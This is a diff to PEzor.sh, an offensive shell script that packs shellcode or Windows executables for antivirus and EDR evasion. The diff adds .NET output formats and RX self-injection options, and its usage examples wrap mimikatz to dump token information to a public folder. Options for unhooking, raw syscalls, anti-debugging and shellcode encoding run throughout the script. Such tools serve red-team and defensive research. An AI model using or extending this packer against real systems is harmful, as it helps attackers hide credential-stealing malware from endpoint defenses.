@@ -37,8 +37,8 @@ OUTPUT_EXTENSION=exe
 SOURCES=""
 
 usage() {
-    echo 'Usage Shellcode: ./PEzor.sh [-32|-64] [-debug] [-syscalls] [-unhook] [-sleep=<SECONDS>] [-sgn] [-antidebug] [-text] [-self] <shellcode.bin>'
-    echo 'Usage PE:        ./PEzor.sh [-32|-64] [-debug] [-syscalls] [-unhook] [-sleep=<SECONDS>] [-sgn] [-antidebug] [-text] [-self] <executable.exe> [donut args]'
+    echo 'Usage PE:        ./PEzor.sh [-32|-64] [-debug] [-syscalls] [-unhook] [-sleep=<SECONDS>] [-sgn] [-antidebug] [-text] [-self] [-rx] [-format=<FORMAT>] <executable.exe> [donut args]'
+    echo 'Usage Shellcode: ./PEzor.sh [-32|-64] [-debug] [-syscalls] [-unhook] [-sleep=<SECONDS>] [-sgn] [-antidebug] [-text] [-self] [-rx] [-format=<FORMAT>] <shellcode.bin>'
     echo ''
     echo 'USAGE
 
@@ -75,9 +75,11 @@ EXAMPLES
   # 64-bit (service dll)
   $ PEzor.sh -format=service-dll mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
   # 64-bit (dotnet)
-  $ PEzor.sh -format=dotnet -self -rx -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
+  $ PEzor.sh -format=dotnet -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
   # 64-bit (dotnet-pinvoke)
-  $ PEzor.sh -format=dotnet-pinvoke -self -rx -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
+  $ PEzor.sh -format=dotnet-pinvoke -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
+  # 64-bit (dotnet-createsection)
+  $ PEzor.sh -format=dotnet-createsection -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
   # 32-bit (self-inject)
   $ PEzor.sh -unhook -antidebug -text -self -sleep=120 mimikatz/Win32/mimikatz.exe -z 2
   # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread)
@@ -103,6 +105,10 @@ OPTIONS
   -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll, dotnet, dotnet-createsection, dotnet-pinvoke)
 
 EXAMPLES
+  # 64-bit (self-inject RWX)
+  $ PEzor.sh shellcode.bin
+  # 64-bit (self-inject RX)
+  $ PEzor.sh -unhook -antidebug -text -self -rx -sleep=120 shellcode.bin
   # 64-bit (self-inject)
   $ PEzor.sh -unhook -antidebug -text -self -sleep=120 shellcode.bin
   # 64-bit (raw syscalls)
@@ -113,6 +119,12 @@ EXAMPLES
   $ PEzor.sh -format=service-exe shellcode.bin
   # 64-bit (service dll)
   $ PEzor.sh -format=service-dll shellcode.bin
+  # 64-bit (dotnet)
+  $ PEzor.sh -format=dotnet shellcode.bin
+  # 64-bit (dotnet-pinvoke)
+  $ PEzor.sh -format=dotnet-pinvoke shellcode.bin
+  # 64-bit (dotnet-createsection)
+  $ PEzor.sh -format=dotnet-createsection shellcode.bin
   # 32-bit (self-inject)
   $ PEzor.sh -unhook -antidebug -text -self -sleep=120 shellcode.bin
   # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread)
@@ -216,10 +228,10 @@ if [ $BITS -eq 32 ] && [ $SYSCALLS = true ]; then
     exit 1
 fi
 
-# if [ $SELF = true ] && [ $SYSCALLS = true ]; then
-#     echo '[x] Error: cannot execute raw syscalls when self-executing the payload'
-#     exit 1
-# fi
+if [[ $OUTPUT_FORMAT == dotnet* ]] && [ $SYSCALLS = true ]; then
+    echo '[x] Error: cannot inline syscalls when targeting .NET'
+    exit 1
+fi
 
 if [ $RX = true ] && [ $SGN = true ]; then
     echo '[x] Error: cannot encode the shellcode when self-executing the payload'
